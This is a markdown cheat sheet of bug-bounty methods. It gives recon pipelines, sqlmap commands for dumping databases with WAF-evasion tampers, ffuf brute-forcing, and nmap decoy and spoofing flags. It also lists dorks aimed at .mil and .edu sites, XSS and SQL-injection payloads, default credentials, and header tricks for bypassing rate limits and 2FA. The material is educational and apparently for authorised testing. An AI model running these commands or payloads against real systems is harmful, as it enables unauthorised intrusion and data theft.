# 🛡️ Cybersecurity Tools & Techniques

## 🔍 Subdomain Enumeration Tools

- [Security Trails](https://securitytrails.com)
- [Subdomain Finder](https://subdomainfinder.c99.nl)
- [Shrewd Eye](https://shrewdeye.app)
- **Subfinder Tool:**
  ```sh
  subfinder -d xxxx.com -all --recursive
  ```
- **Asset Finder:**
  ```sh
  echo "xxxx.com" | assetfinder --subs-only
  ```
- **Removing Spaces & Wildcards in VS Code:**
  ```
  \s.  # To remove spaces
  \*.  # To remove * from the code
  ```
- **Combining & Filtering Results:**
  ```sh
  cat subdomain.txt | anew >> new_subs.txt
  cat subdomain.txt | wc
  ```
- **Wordlists:**
  - [Assetnote Wordlists](https://wordlists.assetnote.io)
- **FFUF (Fuzz Faster U Fool)**
  ```sh
  ffuf -u https://FUZZ -w wordlist -fc 403,500 -v
  ```
  ```sh
  cat * >> all.txt  # Merge all wordlists
  cat all.txt | anew >> all_new.txt
  ```
  ```sh
  ffuf -u https://FUZZ -w all.txt -fc 403,500 -v -t 2000
  ```
- **Finding Hidden Subdomains:**

  ```sh
  ffuf -w wordlist -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs <size_num>
  ```

  💡 _To resolve subdomains manually, edit `/etc/hosts` and add the IP of `ffuf.me`._

- **Amass:**
  ```sh
  amass intel -org "Tesla"
  amass intel -active -asn [ASN]
  amass intel -active -cidr [CIDR]
  ```
- **Certificate Transparency Logs:**
  - [crt.sh](https://crt.sh) - Search by domain or company name.

---

## 📜 Information Gathering

- **Mind Mapping:** [XMind](https://www.xmind.net)
- **OSINT Framework:** [OSINT Framework](https://osintframework.com)
- **Telegram Database Lookup:** `database_lookupbot`
- **Business Info:** [Crunchbase](https://www.crunchbase.com)

---

# 💾 SQL Injection

## 1️⃣ Finding Vulnerable Parameters

Use **Arjun** to detect possible injectable parameters:

```sh
arjun -u "https://example.com"
```

or specify a particular method (GET/POST):

```sh
arjun -u "https://example.com" -m POST
```

---

## 2️⃣ SQLMap Basic Usage

### **GET Request**

```sh
sqlmap -u "https://example.com/file.php?parameter=*"
```

### **POST Request**

```sh
sqlmap -u "https://example.com" --data "parameter=*"
```

### **Cookie-Based Injection**

```sh
sqlmap -u "https://example.com" --cookie "parameter=*"
```

### **Using Burp Suite Requests**

```sh
sqlmap -r request.txt
```

(Burp Suite request must be saved as `request.txt`)

---

## 3️⃣ Advanced SQLMap Usage

### **Full Database Dump with Evasion Techniques**

```sh
sqlmap -u "https://example.com" --dump --risk 3 --level 5 --random-agent --tamper=randomcase,uppercase,space2comment
```

### **Testing for Specific Parameter**

```sh
sqlmap -u "https://example.com/file.ashx?id=*&name=oajof&age=xxx" -p id --technique=BEUSTQ --dbs
```

### **Batch Mode with Additional Flags**

```sh
sqlmap -r request.txt  --batch --random-agent --tamper=space2comment --drop-set-cookie --banner --threads 10 --dbs
```

---

## 4️⃣ Targeting Specific Databases

### **Example: MySQL Exploitation**

```sh
sqlmap -u "https://example.com?offset=1" -p offset --level 5 --risk 3 --dbms=MySQL --hostname --test-filter="MySQL >= 5.0.12 stacked queries" --ignore-code 500
```

### **Checking Headers (Cookies, User-Agent, X-Forwarded-For, Host)**

```sh
sqlmap -u "https://example.com" --headers="Cookie: *" -H "x-forwarded-for: *" -H "x-forwarded-Host: *"
```

### **Dumping All Data from Cookies**

```sh
sqlmap -u "https://example.com" --cookie="id=*" --dump-all
```

---

## 5️⃣ SQL Injection Techniques

| Code  | Technique           |
| ----- | ------------------- |
| **B** | Boolean-based blind |
| **E** | Error-based         |
| **U** | Union query-based   |
| **S** | Stacked queries     |
| **T** | Time-based blind    |
| **Q** | Inline queries      |

To use **all** techniques:

```sh
--technique=BEUSTQ
```

---

## 6️⃣ Extra Tips

- **Use `--risk 3` and `--level 5` for aggressive scans.**
- **Consider `--random-agent` to spoof User-Agent.**
- **Use `--tamper` scripts for WAF bypass (e.g., `space2comment`, `randomcase`, `between`).**
- **Save output with `--output-dir=/path/to/folder` for logging.**

### 🔍 SQLMap Techniques:

- `B` - Boolean-based blind
- `E` - Error-based
- `U` - Union query-based
- `S` - Stacked queries
- `T` - Time-based blind
- `Q` - Inline queries
- **Use all techniques:** `--technique=BEUSTQ`

---

## 🏴‍☠️ Fuzzing & Brute Forcing

### **FFUF for Directory & Subdomain Discovery**

- **Directories:**
  ```sh
  ffuf -u https://example.com/FUZZ -w wordlist.txt
  ```
- **Subdomains:**
  ```sh
  ffuf -u https://FUZZ.example.com -w subdomains.txt
  ```
- **Filtering:**
  ```sh
  ffuf -u https://FUZZ.example.com -w file.txt -fc 404 -fs 2000 -fw 20 -fl 2
  ```
- **Increasing Threads:**
  ```sh
  ffuf -u https://FUZZ.example.com -w file.txt -t 2000
  ```
- **Multiple Directories:**
  ```sh
  ffuf -u https://FUZZ.example.com/FUZZ1/FUZZ2 -w file1.txt:FUZZ1 -w file2.txt:FUZZ2
  ```
- **Parameter Fuzzing:**
  ```sh
  ffuf -u https://example.com/file.php?FUZZ=1 -w parameters.txt
  ```
- **Bypassing Rate Limits:**
  ```sh
  ffuf -u https://example.com/FUZZ -w wordlist.txt -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1"
  ```

### **DirSearch for Directory Enumeration**

- **Basic Usage:**
  ```sh
  dirsearch -u https://example.com
  ```
- **Advanced Mode:**
  ```sh
  dirsearch -u https://example.com -e conf,config,bak,backup,sql,js,json
  ```
- **Full URL Display:**
  ```sh
  dirsearch -u https://example.com --full-url
  ```
- **Using a List of Domains:**
  ```sh
  dirsearch -l $(pwd)/httpx.txt --full-url
  ```
- **Filtering Responses:**

  ```sh
  dirsearch -u https://example.com -i 200

  ```

---

## 🔥Port Scanning

### **Nmap Commands:**

```sh
nmap -Pn  # Bypass firewall & disable ICMP
nmap -f   # Fragmentation to bypass firewalls
nmap --script=vuln  # Scan for vulnerabilities
nmap --script=ssh*  # Scan SSH-related vulnerabilities
nmap -sn  # Disable port scanning
nmap -sS  # SYN Scan
nmap -n   # Disable DNS resolution
nmap -p-  # Scan all 65,535 ports
nmap -O   # Detect OS
```

### **Evading Detection:**

```sh
nmap -D RND:5  # Use random decoys
nmap -S xxx.xxx.xxx.xxx  # Spoof source IP
nmap --source-port 53  # Perform scans from port 53
```

---

# 🔍 Google Dorking Cheat Sheet

## **Introduction**

Google Dorking (or Google hacking) is a technique used to discover sensitive information exposed on the internet using advanced search queries. Below is a collection of Google Dorks useful for finding APIs, login pages, configurations, and vulnerabilities.

---

## **1️⃣ Finding API Endpoints**

```sh
site:example[.]com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3
```

## **2️⃣ Searching for Specific File Extensions and Technologies**

```sh
site:*.example.com inurl:.aspx
```

## **3️⃣ Finding Joomla Vulnerabilities**

```sh
inurl:component/content/
inurl:component/content/?view=featured&format=feed&type=atom
inurl:index.php/using-joomla/extensions/modules/ intext:joomla! 1.7
inurl:index.php/using-joomla/extensions/modules/19-sample-data-articles/joomla/50-upgraders
inurl:using-joomla/extensions/templates/beez5/home-page-beez5
inurl:index.php?format=feed&type=rss
inurl:index.php/using-joomla/extensions/plugins?format=feed&type=rss
inurl:index.php?format=feed&type=atom
intext:"joomla! 1.7 - Open Source Content Management"
intext:"joomla! 1.6 - Open Source Content Management"
intext:Joomla 1.6 inurl:index.php/login
intext:Joomla 1.7 inurl:index.php/login
intext:Joomla 1.6 inurl:index.php/registration
intext:Joomla 1.7 inurl:index.php/registration
```

## **4️⃣ Detecting Admin and Login Pages**

```sh
inurl:index.php/plugins site:
inurl:index.php/rss=feed site:
```

## **5️⃣ Finding Exposed Git Repositories**

```sh
intext:"index of /.git"
```

## **6️⃣ Finding Admin Panels and Login Pages**

```sh
site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp
```

## **7️⃣ Identifying SQL Errors and Vulnerabilities**

```sh
site:..edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
```

## **8️⃣ Finding Social Media Links for Military Domains**

```sh
site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com | link:www.hackerone.com | link:www.slack.com | link:www.github.com
```

## **9️⃣ Detecting GeoServer Vulnerabilities**

```sh
inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)
inurl:/geoserver/ows?service=wfs
```

## **🔟 Searching for Backup Files and Misconfigurations**

```sh
site:*.* AND (ext:backup OR ext:bak OR ext:old)
```

## **1️⃣1️⃣ WordPress API Discovery**

```sh
inurl:"/wp-json/wp/v2/users"  # Get all users in WordPress API
```

## **1️⃣2️⃣ Finding Public API Directories**

```sh
inurl:"/includes/api" intext:"index of /"  # Find API directories
```

## **1️⃣3️⃣ Searching for API Key Files**

```sh
intitle:"index.of" intext:"api.txt"  # Find API key files
```

## **1️⃣4️⃣ Finding SQL Injection Vulnerabilities**

```sh
ext:php inurl:"api.php?action="  # Potential SQL Injection
```

## **1️⃣5️⃣ Finding Exposed API Keys**

```sh
intitle:"index of" api_key OR "api key" OR apiKey -pool
```

---

### **🛡️ Disclaimer:**

Google Dorking should only be used ethically and legally. Unauthorized use of these queries on systems you do not own or have permission to test may be illegal and could result in legal consequences.
🚀 Use responsibly and stay safe!

## 📜 Subdomain takeover

```sh
 subzy run --targets all.txt --vuln --hide_fails | grep -v -E "Akamai|xyz|available|\-"
```

```sh
subjack -w all.txt -t 100 -timeout 30 -o takeovers -ssl
```

# 🔐 Sign Up Vulnerabilities Cheat Sheet

## **Introduction**

Sign-up vulnerabilities can allow attackers to take over accounts, bypass security measures, and exploit flaws in authentication mechanisms. Below is a list of common sign-up vulnerabilities and their attack scenarios.

---

## **1️⃣ Use of Insecure HTTP**

```sh
- Ensure HTTPS is enforced; avoid HTTP-based sign-ups.
```

## **2️⃣ No Confirmation Code Check**

```sh
- If an email verification step is missing, an attacker can register using an admin’s email and hijack the account.
```

## **3️⃣ Reusable Confirmation Links**

```sh
- Test if the confirmation link can be used multiple times to gain access to an account.
```

## **4️⃣ OTP Rate Limiting**

```sh
- If OTPs are sent, check for rate limits; an attacker might brute-force OTPs if no limits exist.
```

## **5️⃣ OTP Leaked in Response**

```sh
- Intercept the request and verify if the OTP is exposed in the response.
```

## **6️⃣ Pre-Account Takeover via 2FA**

```sh
- Create an account but do not confirm it.
- Go to settings and enable Two-Factor Authentication (2FA).
- This may allow a pre-account takeover scenario.
```

## **7️⃣ Social Login Pre-Account Takeover**

```sh
- Create an account but do not confirm it.
- Try linking it with Google or Facebook authentication.
- This could result in a pre-account takeover.
```

## **8️⃣ OAuth Exploitation Scenario**

```sh
1. Attacker creates an account with victim@gmail.com but does not verify it.
2. Victim registers using Google OAuth.
3. Attacker’s unverified account is now verified (Verification Bypass).
```

## **9️⃣ Bypassing Email Verification**

```sh
1. Create an account using victim@gmail.com but do not verify it.
2. Log in and navigate to settings.
3. Change the email to hacker@gmail.com and receive the confirmation link.
4. Click on the confirmation link, and victim@gmail.com is now verified.
```

## **🔟 Account Deletion Without Password Confirmation**

```sh
- Test if an account can be deleted without entering the password.
```

## **1️⃣1️⃣ XSS via Username Input**

```sh
- Test if special characters in the username cause XSS vulnerabilities:
  - username='"><u>hossamshady
  - username="<svg/onload=confirm(document.cookie)>"@x.y
  - username="hossam@gmail.com'"><svg/onload=confirm(1)>"
  - username="\><img src=https://example.com/xss.png>"@x.y
```

---

# 🔑 Login Vulnerabilities Cheat Sheet

## **Introduction**

Login vulnerabilities can allow attackers to gain unauthorized access, exploit authentication mechanisms, and compromise user accounts. Below is a list of common login vulnerabilities and attack scenarios.

---

## **1️⃣ Insecure Data Transfer**

```sh
- Check if the login page is using HTTP instead of HTTPS, which exposes credentials to interception.
```

## **2️⃣ No Rate Limit on Password Attempts**

```sh
- If there is no rate limit, brute-force attacks can be performed.
- Example: https://hackerone.com/reports/410451
```

## **3️⃣ Testing for Default Credentials**

```sh
- Try using common default credentials:
  - test:test
  - admin:admin
  - admin:password
  - kali:kali
  - admin:123
  - admin:default
  - root:root
  - root:toor
  - admin:kali
  - kali:root
  - admin:123456789
```

## **4️⃣ SQL Injection in Username**

```sh
- Try injecting SQL commands in the username field:
  - admin' or 1=1; -- -
```

## **5️⃣ Response Manipulation to Bypass Login Page**

```sh
- Intercept the login response using Burp Suite or a proxy tool.
- Modify the response to force authentication bypass.
```

## **6️⃣ SQL Injection Testing via SQLMap**

```sh
- Capture the login request and test for SQL injection using SQLMap:
  - sqlmap -r request.txt --dbs
```

## **7️⃣ XSS Injection in Username**

```sh
- Try injecting an XSS payload in the username field:
  - <svg/onload=confirm()>
```

## **8️⃣ Template Injection in Username**

```sh
- Try injecting a template expression in the username:
  - {{9*9}}
- If `81` is printed, the application is vulnerable to template injection.
```

## **9️⃣ Checking for Leaked Credentials in Source Code**

```sh
- View the source code of the login page using CTRL+U.
- Look for hardcoded credentials or sensitive information.
```

---

# 🔐 2FA Vulnerabilities Cheat Sheet

## **Introduction**

Two-Factor Authentication (2FA) is a critical security feature, but improper implementation can lead to bypasses and account takeovers. Below is a list of common 2FA vulnerabilities and attack scenarios.

---

## **1️⃣ Brute Force Attack on 2FA Codes**

```sh
- Try common codes: 000000 - 123456
- Check if the system accepts a null value for 2FA.
```

## **2️⃣ Reusing OTP Codes**

```sh
- Try using a previously used OTP code.
- Test if OTP from another account works.
```

## **3️⃣ No Rate Limit on 2FA Attempts**

```sh
- If no rate limit exists, an attacker can brute-force OTPs.
```

## **4️⃣ Exposed 2FA Code in Response**

```sh
- Inspect server responses to see if the OTP is leaked in JSON, HTML, or other responses.
```

## **5️⃣ Bypassing 2FA via Password Reset Link**

```sh
1. Enable 2FA on the account.
2. Logout.
3. Reset password and click on the link.
4. If you gain access without 2FA, it’s a vulnerability.
```

## **6️⃣ Bypassing 2FA via OAuth (Google Login)**

```sh
1. Log in to the account.
2. Enable 2FA.
3. Log in using Google OAuth.
4. If access is granted without 2FA, it’s vulnerable.
```

## **7️⃣ No Rate Limit on Sending 2FA Codes**

```sh
- Check if OTPs can be spammed, leading to abuse or DoS attacks.
```

## **8️⃣ Response Manipulation to Bypass 2FA**

```sh
- Modify server response from:
  - 403 Forbidden => 200 OK
  - false => true
  - 0 => 1
  - failed => successful
```

## **9️⃣ Bypassing 2FA by Skipping the Next Step**

```sh
- Attempt to proceed to the next step without entering the OTP.
```

## **🔟 Enabling 2FA Without Email Verification**

```sh
- If 2FA can be enabled without verifying email, this could lead to pre-account takeover.
```

## **1️⃣1️⃣ Sessions Persist After Enabling 2FA**

```sh
- Check if enabling 2FA logs out other sessions.
- Changing the password should terminate all active sessions.
```

---

# 🛠️ Broken Session Management Cheat Sheet

## **Introduction**

Broken session management can lead to unauthorized access, session hijacking, and security vulnerabilities. Below is a list of common session management flaws and their attack scenarios.

---

## **1️⃣ Session Persistence After Password Change**

```sh
1. Log into your account with Firefox and Chrome.
2. Change the password in Firefox.
3. Observe that the Chrome session remains active.
4. This indicates broken session management.
```

## **2️⃣ Session Persistence After Enabling 2FA**

```sh
1. Log into your account with Firefox and Chrome.
2. Enable 2FA in Firefox.
3. Reload the page in Chrome.
4. If the session is still valid, it's a vulnerability.
```

## **3️⃣ Expired Session Still Valid for Requests**

```sh
1. Log into your account and update a setting.
2. Intercept the request with Burp Suite.
3. Send the request to the repeater.
4. Log out from your account.
5. Use the request in the repeater to update the setting.
6. If it still works, the session is not invalidated properly.
```

## **4️⃣ Password Reset Link Still Works After Password Change**

```sh
1. Request a password reset but do not use the link.
2. Log in with your username and password.
3. Change the password.
4. Log out from the account.
5. Use the original password reset link.
6. If it still works, session invalidation is broken.
```

## **5️⃣ Back Navigation After Logout Still Shows Sensitive Data**

```sh
1. Log out from your account.
2. Press `Alt + Left Arrow` or use the browser back button.
3. If session data is still visible, there is a broken cache vulnerability.
```

## **6️⃣ Email Update Sends OTP to Old Email Instead of New One**

```sh
- When updating an email, ensure that the OTP is sent to the new email, not the existing one.
- If OTP is sent to the old email, it allows for verification bypass.
```

## **7️⃣ Email Update Loophole Allows Account Takeover**

```sh
1. Create an account with Email A (victim's email).
2. Update the email to B (hacker's email) and verify it.
3. Update the email back to A (victim's email).
4. If A is still shown as verified, it's a vulnerability.
```

## **8️⃣ Verification Bypass via Email Update**

```sh
1. Create an account with victim@gmail.com but do not verify it.
2. Update the email to hacker@gmail.com.
3. Click on the verification link.
4. If victim@gmail.com is now verified, the system is vulnerable.
```

---

# ⏳ Rate Limit Vulnerabilities Cheat Sheet

## **Introduction**

Rate limiting is an essential security control that prevents brute-force attacks, abuse, and excessive requests. The lack of proper rate limits can lead to security vulnerabilities and exploitation. Below is a list of common rate limit vulnerabilities and attack techniques.

---

## **1️⃣ Common Rate Limit Vulnerabilities**

```sh
1. No rate limit on the login page → allows brute-force attacks.
2. No rate limit on internal password change.
3. No rate limit on sending reset password link → attacker can spam requests.
4. No rate limit on OTP/2FA codes → can lead to account takeover.
5. No rate limit on the contact us page → allows spam attacks.
6. No rate limit on comment sections → can lead to spam or abuse.
7. No rate limit on reporting comments → allows mass reporting abuse.
8. No rate limit on SSH (Port 22) → enables brute-force attacks on SSH.
```

---

## **2️⃣ Bypassing Rate Limits with HTTP Headers**

Attackers may try to bypass rate limits by modifying request headers:

```sh
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Origination-IP: 127.0.0.1 or 0.0.0.0
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

---

## **3️⃣ Example: Brute-Forcing Login with FFUF**

```sh
ffuf -u https://example.com -w wordlist.txt --data "username=admin&password=FUZZ" \
  -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1"
```

---

## **4️⃣ Manipulating HTTP Response Codes to Bypass Rate Limits**

```sh
- Modify server responses:
  - 429 (Too Many Requests) → Change to 403 (Forbidden) or 200 (OK)
  - false → true
  - 0 → 1
  - failed → successful
```

---

# 📜 JavaScript Analysis Cheat Sheet

## **1️⃣ Collect JavaScript Files**

```sh
# Using Wayback Machine
waybackurls example.com > allurls.txt

# Using Gospider
gospider -s https://example.com -o gospider_output

# Using Katana
katana -u https://example.com -o katana_output

# Combine all results
cat gospider_output katana_output >> allurls.txt
```

---

## **2️⃣ Extract JavaScript Files**

```sh
# Filter JavaScript files from collected URLs
cat allurls.txt | grep -E "\.js$" >> javascript_files.txt
```

---

## **3️⃣ API Key Extraction with Mantra**

```sh
# Scan for API keys inside JavaScript files
cat javascript_files.txt | mantra
```

---

## **4️⃣ Secret and URL Extraction with Jsluice**

```sh
# Extract URLs from JavaScript files
jsluice urls player.js

# Extract secrets from JavaScript files
jsluice secrets player.js

# Loop through all files
for i in $(ls); do jsluice secrets $i; done
```

---

## **5️⃣ JavaScript Security Analysis with Nuclei**

```sh
# Scan JavaScript files for exposures using Nuclei templates
nuclei -l javascript_files.txt -t /root/nuclei-templates/http/exposures/ -mhe 4
```

---

## **6️⃣ Beautify & Analyze JavaScript Code**

```sh
# Use JS Beautifier in VS Code or online tools
```

---

### **🛡️ Disclaimer:**

Testing for these vulnerabilities should only be performed ethically and legally. Unauthorized exploitation of security weaknesses can result in legal consequences.

🚀 Stay safe and hack responsibly!

# 🏆 Choosing a Bug Bounty Program & Dorks

## **1️⃣ Popular Bug Bounty Platforms**

- [HackerOne](https://hackerone.com)
- [Bugcrowd](https://bugcrowd.com)
- [Intigriti](https://intigriti.com)
- [YesWeHack](https://yeswehack.com)

---

## **2️⃣ Bug Bounty Dorks for Reconnaissance**

### **Finding Bug Bounty Programs**

```sh
inurl:/bug bounty
inurl:/security
inurl:security.txt
inurl:security "reward"
inurl:/responsible disclosure
inurl:/responsible-disclosure/ reward
inurl:/responsible-disclosure/ swag
inurl:/responsible-disclosure/ bounty
```

### **Responsible Disclosure Programs**

```sh
inurl:'/responsible disclosure' hoodie
responsible disclosure swag r=h:com
responsible disclosure hall of fame
inurl:responsible disclosure $50
responsible disclosure europe
responsible disclosure white hat
white hat program
insite:"responsible disclosure" -inurl:nl
```

### **Searching for Security Reports**

```sh
intext:security report reward
site eu responsible disclosure
site .nl responsible disclosure
site responsible disclosure
responsible disclosure:sites
responsible disclosure bounty r=h:nl
responsible disclosure bounty r=h:uk
responsible disclosure bounty r=h:eu
```

### **Bug Bounty Report Filtering**

```sh
"powered by bugcrowd" -site:bugcrowd.com
"submit vulnerability report"
"submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone"
```

### **Government & Educational Security Programs**

```sh
site:*.gov.* "responsible disclosure"
intext:"we take security very seriously"
site:responsibledisclosure.com
```

### **Finding Public Vulnerability Disclosures**

```sh
inurl:'vulnerability-disclosure-policy' reward
intext:Vulnerability Disclosure site:nl
intext:Vulnerability Disclosure site:eu
```

### **Searching for Security Policies**

```sh
inurl:security-policy.txt ext:txt
site:*.*.* inurl:bug inurl:bounty
site:help.*.* inurl:bounty
site:support.*.* intext:security report reward
```

### **Looking for Bounty Rewards**

```sh
intext:security report monetary inurl:security
intext:security report reward inurl:report
site:security.*.* inurl:bounty
```

### **Country-Specific Bug Bounty Programs**

```sh
site:*.*.de inurl:bug inurl:bounty
site:*.*.uk intext:security report reward
site:*.*.cn intext:security report reward
```

### **Bug Bounty & Cryptocurrency Rewards**

```sh
"BugBounty" and "BTC" and "reward"
intext:bounty inurl:/security
inurl:"bug bounty" and "€" and inurl:/security
inurl:"bug bounty" and "$" and inurl:/security
inurl:"bug bounty" and "INR" and inurl:/security
```

### **Hunting for Security.txt Files**

```sh
inurl:/security.txt "mailto*" -github.com -wikipedia.org -portswigger.net -magento
/trust/report-a-vulnerability
```

### **University-Based Responsible Disclosure**

```sh
site:*.edu intext:security report vulnerability
"cms" bug bounty
```

### **General Responsible Disclosure Searches**

```sh
"If you find a security issue" "reward"
"responsible disclosure" intext:"you may be eligible for monetary compensation"
inurl:"responsible disclosure", "bug bounty", "bugbounty"
intext: we offer a bounty
```

### **Country-Specific Responsible Disclosure Programs**

```sh
site:*.br responsible disclosure
site:*.at responsible disclosure
site:*.be responsible disclosure
site:*.au responsible disclosure
```

### **Bug Bounty Searches by Currency**

```sh
site:*/security.txt "bounty"
inurl:bug bounty intext:"rupees"
inurl:bug bounty intext:"₹"
inurl:responsible disclosure intext:"INR"
```

---

### **🛡️ Disclaimer:**

Use these queries responsibly and within legal boundaries. Unauthorized use may result in legal consequences.

🚀 Stay ethical and happy hunting!

# 🌍 live hacking 1

## **1️⃣ Subdomain Enumeration**

```sh
# Save all subdomains
subfinder -d example.com -o subdomains.txt
```

## **2️⃣ Remove Duplicate Subdomains**

```sh
cat subdomains.txt | anew >> unique_subdomains.txt
rm subdomains.txt
```

## **3️⃣ Port Scanning for Subdomains**

```sh
nmap -iL unique_subdomains.txt -o scan.txt
```

## **4️⃣ Check for Subdomain Takeover with Subzy**

```sh
subzy run --targets unique_subdomains.txt --vuln --hide_fails
```

## **5️⃣ Identify Live Sites**

```sh
cat unique_subdomains.txt | httpx -o httpx
```

## **6️⃣ Check for Request Smuggling Vulnerabilities**

```sh
cat httpx | smuggler
```

## **7️⃣ Filter Valid (200 OK) Websites**

```sh
cat httpx | httpx -mc 200 -o httpx200.txt
```

## **8️⃣ Directory & File Discovery Using Dirsearch**

```sh
dirsearch -l $(pwd)/httpx -o dirsearch.txt -i 200 -e conf,config,bak,backup,db,sql,php,json
```

## **9️⃣ Run Nuclei for Automated Vulnerability Scanning**

```sh
nuclei -l httpx -o nuclei.txt -t /root/nuclei-templates/
```

## **🔟 Gather All URLs Using Multiple Tools**

```sh
# Wayback Machine
cat httpx | waybackurls >> allurls.txt

# Katana
katana -list httpx -o katana.txt

# Gospider
gospider -s httpx -o gospider_output
```

## **1️⃣1️⃣ Extract JavaScript & PHP Files**

```sh
# Extract JavaScript files
cat allurls.txt | grep -E "\.js$" >> javascript.txt

# Extract PHP files
cat allurls.txt | grep -E "\.php$" >> php.txt
```

## **1️⃣2️⃣ Analyze JavaScript for API Keys & Secrets**

```sh
# Extract API keys with Mantra
cat javascript.txt | mantra

# Scan JavaScript exposure with Nuclei
nuclei -l javascript.txt -t /root/nuclei-templates/http/exposures/
```

## **1️⃣3️⃣ Extract Parameters from PHP Files Using Arjun**

```sh
arjun -i php.txt >> arjun.txt
```

---

# 🌍 live hacking 2

## **1️⃣ Subdomain Enumeration**

```sh
# Save all subdomains
subfinder -d example.com -o subdomains.txt
```

## **2️⃣ Remove Duplicate Subdomains**

```sh
cat subdomains.txt | anew >> unique_subdomains.txt
rm subdomains.txt
```

## **3️⃣ Port Scanning for Subdomains**

```sh
nmap -iL unique_subdomains.txt -o scan.txt

# Example: Scanning port 21 for a specific domain
nmap -p21 -sV hossam.com
```

## **4️⃣ Check for Subdomain Takeover with Subzy**

```sh
subzy run --targets unique_subdomains.txt --vuln --hide_fails
```

## **5️⃣ Identify Live Sites**

```sh
cat unique_subdomains.txt | httpx -o httpx
cat httpx | httpx -mc 200 -o httpx200.txt
```

## **6️⃣ Check for Request Smuggling Vulnerabilities**

```sh
cat httpx | smuggler
```

## **7️⃣ Filter Valid (200 OK) Websites**

```sh
cat httpx | httpx -mc 200 -o httpx200.txt
```

## **8️⃣ Directory & File Discovery Using Dirsearch**

```sh
dirsearch -l $(pwd)/httpx -o dirsearch.txt -i 200 -e conf,config,bak,backup,db,sql,php,json
```

## **9️⃣ Run Nuclei for Automated Vulnerability Scanning**

```sh
nuclei -l httpx -o nuclei.txt -t /root/nuclei-templates/
```

## **🔟 Gather All URLs Using Multiple Tools**

```sh
# Wayback Machine
cat httpx | waybackurls >> allurls.txt

# Katana
katana -list httpx -o katana.txt

# Gospider
gospider -s httpx -o gospider_output
```

## **1️⃣1️⃣ Extract JavaScript & PHP Files**

```sh
# Extract JavaScript files
cat allurls.txt | grep -E "\.js$" >> js.txt

# Extract PHP files
cat allurls.txt | grep -E "\.php$" >> php.txt
```

## **1️⃣2️⃣ Analyze JavaScript for API Keys & Secrets**

```sh
# Extract API keys with Mantra
cat js.txt | mantra

# Scan JavaScript exposure with Nuclei
nuclei -l js.txt -t /root/nuclei-templates/http/exposures/
```

## **1️⃣3️⃣ Extract Parameters from PHP Files Using Arjun**

```sh
arjun -i php.txt >> arjun.txt
```

## **1️⃣4️⃣ SQL Injection Testing**

```sh
# Identified parameter in target URL
sqlmap -u "https://mars.com/file.php?id=*" --risk 3 --level 5 --random-agent --banner --batch --dbs --ignore-code 403

# POST request example
sqlmap -u "https://mars.com" --data "id=*&name=*&x=*" --dbs --banner --batch
```

---

# 🌍 live hacking 4

## **1️⃣ Subdomain Enumeration**

```sh
# Save all subdomains
subfinder -d example.com -o subdomains.txt
```

## **2️⃣ Remove Duplicate Subdomains**

```sh
cat subdomains.txt | anew >> unique_subdomains.txt
rm subdomains.txt
```

## **3️⃣ Port Scanning for Subdomains**

```sh
nmap -iL unique_subdomains.txt -o scan.txt

# Example: Scanning port 21 for a specific domain
nmap -p21 -sV hossam.com
```

## **4️⃣ Check for Subdomain Takeover with Subzy**

```sh
subzy run --targets unique_subdomains.txt --vuln --hide_fails
```

## **5️⃣ Identify Live Sites**

```sh
cat unique_subdomains.txt | httpx -o httpx
cat httpx | httpx -mc 200 -o httpx200.txt
```

## **6️⃣ Check for Request Smuggling Vulnerabilities**

```sh
cat httpx | smuggler
```

## **7️⃣ Filter Valid (200 OK) Websites**

```sh
cat httpx | httpx -mc 200 -o httpx200.txt
```

## **8️⃣ Directory & File Discovery Using Dirsearch**

```sh
dirsearch -l $(pwd)/httpx -o dirsearch.txt -i 200 -e conf,config,bak,backup,db,sql,php,json
```

## **9️⃣ Run Nuclei for Automated Vulnerability Scanning**

```sh
nuclei -l httpx -o nuclei.txt -t /root/nuclei-templates/
```

## **🔟 Gather All URLs Using Multiple Tools**

```sh
# Wayback Machine
cat httpx | waybackurls >> allurls.txt

# Katana
katana -list httpx -o katana.txt

# Gospider
gospider -s httpx -o gospider_output
```

## **1️⃣1️⃣ Extract JavaScript & PHP Files**

```sh
# Extract JavaScript files
cat allurls.txt | grep -E "\.js$" >> js.txt

# Extract PHP files
cat allurls.txt | grep -E "\.php$" >> php.txt
```

## **1️⃣2️⃣ Analyze JavaScript for API Keys & Secrets**

```sh
# Extract API keys with Mantra
cat js.txt | mantra

# Scan JavaScript exposure with Nuclei
nuclei -l js.txt -t /root/nuclei-templates/http/exposures/
```

## **1️⃣3️⃣ Extract Parameters from PHP Files Using Arjun**

```sh
arjun -i php.txt >> arjun.txt
```

## **1️⃣4️⃣ SQL Injection Testing**

```sh
# Identified parameter in target URL
sqlmap -u "https://mars.com/file.php?id=*" --risk 3 --level 5 --random-agent --banner --batch --dbs --ignore-code 403

# POST request example
sqlmap -u "https://mars.com" --data "id=*&name=*&x=*" --dbs --banner --batch
```

## **1️⃣5️⃣ WordPress Security Testing with WPScan**

```sh
wpscan --url https://target.com --disable-tls-checks --api-token YOUR_API_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```

### **Common WordPress Endpoints for Username Exposure**

```sh
/wp-json/wp/v2/users
/wp-json/?rest_route=/wp/v2/users/
/wp-json/?rest_route=/wp/v2/users/n
/index.php?rest_route=/wp-json/wp/v2/users
/index.php?rest_route=/wp/v2/users
/author-sitemap.xml
/wp-content/debug.log
/wp-login.php?action=register
/wp-content/uploads/
```

### **Exploring Historical Website Data**

```sh
https://web.archive.org/cdx/search/cdx?url=*.rockstarenergy.com&fl=original&collapse=urlkey
```

---
